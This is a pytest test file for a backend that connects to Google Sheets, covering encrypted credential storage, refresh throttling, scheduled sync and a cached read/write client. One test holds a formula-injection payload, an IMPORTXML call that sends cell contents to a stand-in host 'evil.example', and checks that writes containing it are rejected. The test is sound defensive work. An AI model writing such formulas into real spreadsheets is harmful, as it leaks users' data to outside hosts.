"""Connected sheets: credentials, seeding, refresh + throttle, the hourly job, the published client.
No network: Google is a stub (or httpx.MockTransport for the real client)."""

import functools
import json
import threading
from urllib.parse import parse_qs

import httpx
import jwt as pyjwt
import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from backend.core import db as core_db, registry
from backend.core.errors import Invalid, NotFound
from backend.core.sheets import api as sheets, google, jobs, service, startup


@functools.cache
def key_json(email: str = "springform@demo-project.iam.gserviceaccount.com") -> str:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
    return json.dumps({
        "type": "service_account", "project_id": "demo-project", "private_key_id": "k1", "private_key": pem.decode(),
        "client_email": email, "token_uri": "https://oauth2.googleapis.com/token",
    })


class Stub:
    """Stands in for google.GoogleSheets; `fail` makes every call raise."""

    def __init__(self, values=None, fail: Exception | None = None):
        self.values = values if values is not None else [["name", "color"], ["Sprocket", "teal"], ["Gear"]]
        self.fail = fail
        self.calls: list[tuple] = []

    def read(self, spreadsheet_id, a1):
        self.calls.append(("read", spreadsheet_id, a1))
        if self.fail:
            raise self.fail
        return self.values

    def write(self, spreadsheet_id, a1, rows):
        self.calls.append(("write", spreadsheet_id, a1, rows))
        if self.fail:
            raise self.fail
        return len(rows)


@pytest.fixture
def stub(monkeypatch):
    s = Stub()
    monkeypatch.setattr(google, "make_client", lambda info: s)
    return s


@pytest.fixture
def admin(app, login_as):
    startup.on_startup()
    return login_as("admin")


def _widgets_id() -> int:
    return core_db.one("SELECT id FROM core_connected_sheets WHERE app = 'example' AND name = 'widgets'")["id"]


def _configure(admin, sheet_id: int, **extra) -> dict:
    assert admin.put("/api/core/sheets/credentials", json={"service_account_json": key_json()}).status_code == 200
    r = admin.patch(f"/api/core/sheets/{sheet_id}", json={"spreadsheet_id": "abc123", "range": "Widgets!A1:C", **extra})
    assert r.status_code == 200, r.text
    return r.json()


def _add_sheet(name: str, mode: str = "read", schedule: str = "hourly", enabled: bool = True) -> int:
    with core_db.transaction() as conn:
        service.seed_in(conn, [("example", registry.Sheet(name=name, mode=mode))])
    sheet_id = core_db.one("SELECT id FROM core_connected_sheets WHERE name = ?", (name,))["id"]
    service.update_sheet(sheet_id, {"spreadsheet_id": f"id_{name}", "range": "A1:B", "schedule": schedule, "enabled": enabled})
    return sheet_id


# ── Credentials ─────────────────────────────────────────────────────────────────────


def test_credentials_are_stored_encrypted_and_only_the_email_comes_back(admin, login_as):
    assert admin.get("/api/core/sheets/credentials").json() == {"configured": False, "service_account_email": None}
    for bad in ("not json", json.dumps({"type": "authorized_user"}), json.dumps({"type": "service_account", "client_email": "x"}),
                json.dumps({"type": "service_account", "client_email": "x", "private_key": "nope"})):
        assert admin.put("/api/core/sheets/credentials", json={"service_account_json": bad}).status_code == 422
    r = admin.put("/api/core/sheets/credentials", json={"service_account_json": key_json()})
    assert r.json() == {"configured": True, "service_account_email": "springform@demo-project.iam.gserviceaccount.com"}
    assert "private_key" not in admin.get("/api/core/sheets/credentials").text
    stored = core_db.one("SELECT value, is_secret FROM core_settings WHERE key = 'sheets.service_account_json'")
    assert stored["is_secret"] == 1 and stored["value"].startswith("enc:v1:") and "PRIVATE KEY" not in stored["value"]
    member = login_as("member")
    for method, path in (("get", "/api/core/sheets/credentials"), ("get", "/api/core/sheets"), ("post", "/api/core/sheets/1/refresh")):
        assert getattr(member, method)(path).status_code == 403


# ── Seeding and admin routes ────────────────────────────────────────────────────────


def test_seeding_from_manifests_is_idempotent_and_keeps_admin_settings(admin):
    sheet_id = _widgets_id()
    service.update_sheet(sheet_id, {"spreadsheet_id": "abc", "range": "A1:B"})
    startup.on_startup()
    startup.on_startup()
    rows = core_db.rows("SELECT app, name, description, mode, schedule, enabled, spreadsheet_id FROM core_connected_sheets")
    assert rows == [{"app": "example", "name": "widgets", "description": "A sample sheet of widgets", "mode": "read",
                     "schedule": "hourly", "enabled": 1, "spreadsheet_id": "abc"}]
    listed = admin.get("/api/core/sheets").json()
    assert [(s["id"], s["configured"], s["fetched_at"]) for s in listed] == [(sheet_id, True, None)]


def test_patch_accepts_a_sheet_url_validates_and_repointing_drops_the_cache(admin, stub):
    sheet_id = _widgets_id()
    url = "https://docs.google.com/spreadsheets/d/1AbC-d_9/edit#gid=0"
    sheet = _configure(admin, sheet_id, spreadsheet_id=url, schedule="daily", enabled=False)
    assert (sheet["spreadsheet_id"], sheet["schedule"], sheet["enabled"]) == ("1AbC-d_9", "daily", False)
    assert admin.patch(f"/api/core/sheets/{sheet_id}", json={"schedule": "weekly"}).status_code == 422
    assert admin.patch(f"/api/core/sheets/{sheet_id}", json={"spreadsheet_id": "a b"}).status_code == 422
    assert admin.patch("/api/core/sheets/999", json={"range": "A1"}).status_code == 404
    assert admin.post(f"/api/core/sheets/{sheet_id}/refresh").status_code == 200
    admin.patch(f"/api/core/sheets/{sheet_id}", json={"range": "Other!A1:C"})
    assert admin.get(f"/api/core/sheets/{sheet_id}/preview").json()["fetched_at"] is None


# ── Refresh ─────────────────────────────────────────────────────────────────────────


def test_refresh_caches_header_and_rows_then_throttles_for_60s(admin, stub, freeze):
    freeze("2026-11-02T09:00:00Z")
    sheet_id = _widgets_id()
    assert admin.post(f"/api/core/sheets/{sheet_id}/refresh").status_code == 422  # no spreadsheet yet
    _configure(admin, sheet_id)
    r = admin.post(f"/api/core/sheets/{sheet_id}/refresh")
    assert r.status_code == 200, r.text
    assert (r.json()["row_count"], r.json()["last_synced_at"], r.json()["fetched_at"]) == (2, "2026-11-02T09:00:00Z", "2026-11-02T09:00:00Z")
    assert stub.calls == [("read", "abc123", "Widgets!A1:C")]
    preview = admin.get(f"/api/core/sheets/{sheet_id}/preview").json()
    assert preview["header"] == ["name", "color"] and preview["rows"] == [["Sprocket", "teal"], ["Gear", ""]]

    freeze("2026-11-02T09:00:45Z")
    r = admin.post(f"/api/core/sheets/{sheet_id}/refresh")
    assert r.status_code == 429 and r.json() == {"detail": "throttled", "retry_after": 15} and r.headers["retry-after"] == "15"
    assert len(stub.calls) == 1
    freeze("2026-11-02T09:01:00Z")
    assert admin.post(f"/api/core/sheets/{sheet_id}/refresh").status_code == 200
    assert len(stub.calls) == 2


def test_failed_refresh_records_last_error_keeps_the_cache_and_returns_502(admin, stub, freeze):
    freeze("2026-11-02T09:00:00Z")
    sheet_id = _widgets_id()
    _configure(admin, sheet_id)
    admin.post(f"/api/core/sheets/{sheet_id}/refresh")
    stub.fail = google.SheetsError("Google returned 403: The caller does not have permission.")
    freeze("2026-11-02T09:05:00Z")
    r = admin.post(f"/api/core/sheets/{sheet_id}/refresh")
    assert r.status_code == 502 and "403" in r.json()["detail"]
    sheet = admin.get("/api/core/sheets").json()[0]
    assert sheet["last_error"].startswith("Google returned 403") and sheet["row_count"] == 2
    assert sheets.client("example").read("widgets").stale is True  # cache kept, flagged stale


def test_refresh_without_a_key_is_409(admin, stub):
    sheet_id = _widgets_id()
    service.update_sheet(sheet_id, {"spreadsheet_id": "abc", "range": "A1:B"})
    assert admin.post(f"/api/core/sheets/{sheet_id}/refresh").status_code == 409
    assert stub.calls == []


# ── The hourly job ──────────────────────────────────────────────────────────────────


def test_job_honours_schedule_mode_and_enabled(admin, stub, freeze):
    freeze("2026-11-02T09:00:00Z")
    _configure(admin, _widgets_id())  # hourly
    _add_sheet("daily_one", schedule="daily")
    _add_sheet("manual_one", schedule="manual")
    _add_sheet("off_one", enabled=False)
    _add_sheet("out_one", mode="write")
    refreshed = lambda: sorted({c[1] for c in stub.calls})  # noqa: E731

    jobs.refresh_due(threading.Event())
    assert refreshed() == ["abc123", "id_daily_one"]
    stub.calls.clear()
    freeze("2026-11-02T10:00:30Z")
    jobs.refresh_due(threading.Event())
    assert refreshed() == ["abc123"]  # daily synced an hour ago
    stub.calls.clear()
    freeze("2026-11-03T08:00:30Z")  # 23 h after the daily sync
    jobs.refresh_due(threading.Event())
    assert refreshed() == ["abc123", "id_daily_one"]
    assert jobs.JOBS[0].name == "core.sheets_refresh" and jobs.JOBS[0].every == 3600


def test_job_never_raises_and_records_each_failure(admin, stub, monkeypatch):
    _configure(admin, _widgets_id())
    _add_sheet("daily_one", schedule="daily")
    stub.fail = RuntimeError("boom")
    jobs.refresh_due(threading.Event())
    errors = [r["last_error"] for r in core_db.rows("SELECT last_error FROM core_connected_sheets ORDER BY id")]
    assert errors == ["RuntimeError: boom", "RuntimeError: boom"]
    monkeypatch.setattr(service, "due_in", lambda conn: 1 / 0)
    jobs.refresh_due(threading.Event())  # still no exception


def test_job_without_a_key_does_nothing(admin, stub):
    service.update_sheet(_widgets_id(), {"spreadsheet_id": "abc", "range": "A1:B"})
    jobs.refresh_due(threading.Event())
    assert stub.calls == []


# ── The published client ────────────────────────────────────────────────────────────


def test_client_read_serves_the_cache_and_never_calls_google(admin, stub, monkeypatch, freeze):
    freeze("2026-11-02T09:00:00Z")
    client = sheets.client("example")
    assert client.read("widgets") == sheets.SheetData([], [], None, True)
    _configure(admin, _widgets_id())
    admin.post(f"/api/core/sheets/{_widgets_id()}/refresh")
    calls = list(stub.calls)

    def no_google(info):
        raise AssertionError("read went to Google")

    monkeypatch.setattr(google, "make_client", no_google)
    data = client.read("widgets")
    assert data == sheets.SheetData(["name", "color"], [["Sprocket", "teal"], ["Gear", ""]], "2026-11-02T09:00:00Z", False)
    assert stub.calls == calls
    with core_db.transaction() as conn:
        assert client.read_in(conn, "widgets") == data
    freeze("2026-11-02T11:00:01Z")
    assert client.read("widgets").stale is True  # hourly sheet, cache over two hours old
    assert client.status("widgets") == {
        "configured": True, "enabled": True, "last_synced_at": "2026-11-02T09:00:00Z", "last_error": None, "row_count": 2,
    }
    with pytest.raises(NotFound):
        client.read("nope")


def test_client_write_refuses_formulas_and_read_sheets_then_writes_outside_the_transaction(admin, stub, freeze):
    freeze("2026-11-02T09:00:00Z")
    _configure(admin, _widgets_id())
    sheet_id = _add_sheet("out_one", mode="write")
    client = sheets.client("example")
    with pytest.raises(Invalid, match="IMPORTXML"):
        client.write("out_one", [["name"], ['=IMPORTXML("https://evil.example/?q="&A1, "//a")']])
    with pytest.raises(Invalid, match="read-only"):
        client.write("widgets", [["a"]])
    with pytest.raises(Invalid):
        client.write("out_one", [])
    assert stub.calls == []
    with core_db.transaction(), pytest.raises(RuntimeError, match="outside transaction"):
        client.write("out_one", [["a"]])

    assert client.write("out_one", [["name", "total"], ["Sprocket", 3], ["Gear", None], ["sum", "=SUM(B2:B3)"]]) == 4
    assert stub.calls == [("write", "id_out_one", "A1:B", [["name", "total"], ["Sprocket", 3], ["Gear", ""], ["sum", "=SUM(B2:B3)"]])]
    status = client.status("out_one")
    assert (status["last_synced_at"], status["row_count"], status["last_error"]) == ("2026-11-02T09:00:00Z", 4, None)
    assert core_db.one("SELECT 1 AS x FROM core_sheet_cache WHERE sheet_id = ?", (sheet_id,)) is None  # write leaves the cache


def test_forbidden_formula_and_bound_range():
    assert google.forbidden_formula(' =importdata("x")') == "IMPORTDATA"
    assert google.forbidden_formula("=SUM(A1:A3)") == "" and google.forbidden_formula("see IMPORTXML(") == ""
    assert google.bound_range("Widgets", 100) == "'Widgets'!1:101"
    assert google.bound_range("'My Tab'!A:F", 100) == "'My Tab'!A1:F101"
    assert google.bound_range("A1:C5", 100) == "A1:C5"


# ── The real REST client against a mock transport ───────────────────────────────────


def test_google_client_signs_a_jwt_reads_values_and_explains_a_403():
    info = json.loads(key_json())
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        if request.url.path == "/token":
            form = parse_qs(request.content.decode())
            claims = pyjwt.decode(form["assertion"][0], options={"verify_signature": False})
            assert form["grant_type"] == ["urn:ietf:params:oauth:grant-type:jwt-bearer"]
            assert claims["iss"] == info["client_email"] and claims["scope"] == google.SCOPE
            return httpx.Response(200, json={"access_token": "tok", "expires_in": 3600})
        assert request.headers["authorization"] == "Bearer tok"
        if "denied" in request.url.path:
            return httpx.Response(403, json={"error": {"code": 403, "message": "The caller does not have permission"}})
        return httpx.Response(200, json={"values": [["a", "b"], ["1"]]})

    client = google.GoogleSheets(info, transport=httpx.MockTransport(handler))
    assert client.read("sheet1", "'My Tab'!A1:B") == [["a", "b"], ["1"]]
    assert seen[1].url.raw_path.startswith(b"/v4/spreadsheets/sheet1/values/%27My%20Tab%27%21A1%3AB")
    with pytest.raises(google.SheetsError, match=r"403: The caller does not have permission\. Share the spreadsheet with springform@"):
        client.read("denied", "A1:B")
    assert sum(r.url.path == "/token" for r in seen) == 1  # the token is reused
